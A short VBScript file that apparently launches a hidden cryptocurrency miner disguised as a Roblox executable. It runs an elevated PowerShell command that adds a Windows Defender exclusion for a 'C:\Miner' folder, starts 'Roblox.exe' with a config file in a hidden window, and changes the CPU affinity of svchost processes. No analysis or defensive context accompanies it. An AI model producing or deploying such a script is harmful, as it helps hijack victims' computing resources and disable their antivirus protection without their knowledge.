
CreateObject("WScript.Shell").Run "powershell -Command Start-Process powershell -Verb RunAs -ArgumentList '-Command Add-MpPreference -ExclusionPath " & Chr(34) & "C:\Miner" & Chr(34) & "'", 0, True

WScript.Sleep 2000

CreateObject("WScript.Shell").Run "C:\myRoblox\Roblox.exe --config=C:\myRoblox\config.json", 0, False

WScript.Sleep 4000

CreateObject("WScript.Shell").Run "powershell -Command $p=Get-Process 'svchost'; if($p){$p.ProcessorAffinity=0x1}", 0, True
